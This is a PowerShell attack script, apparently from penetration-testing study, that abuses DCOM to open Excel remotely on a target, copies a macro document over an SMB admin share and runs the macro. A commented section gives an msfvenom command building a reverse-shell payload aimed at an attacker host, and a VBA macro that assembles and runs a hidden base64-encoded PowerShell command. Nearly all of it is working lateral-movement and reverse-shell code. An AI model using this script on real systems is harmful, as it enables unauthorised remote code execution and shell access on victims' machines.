##This script is meant to use DCOM to create and then exploit Microsoft Office
##by creating an Excel document with a Macro that runs Powershell and launches a reverse shell
##and transfering it to the remote system through SMB

##Instantiates the COM we're going to be using, which is Excel.Application on the target
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "TargetIP"))


##Instantiates the local and remote directories for copying the Excel document
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

##Transfers the file, and overwrights the file if present already
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)


##When we instantiated the Excel.Application COM, we did so with the SYSTEM account.
##Since SYSTEM doesn't have a profile like a user, we'll fill in the gaps
##and create a Desktop folder for SYSTEM to use
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)

##Runs the exploit
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")



<#--------------------Payload--------------------#>
<#
msfvenom -p windows/shell_reverse_tcp LHOST=AttackerIP LPORT=AttackerPort -f hta-psh -o evil.hta

This creates the payload in a base64 output. From here, we can extract from the "powershell.exe -nop" onward

Use dcom.py to break the payload up into chunks for the Macro string

**MACRO**

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    ...
    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
    Shell (Str)
End Sub


#>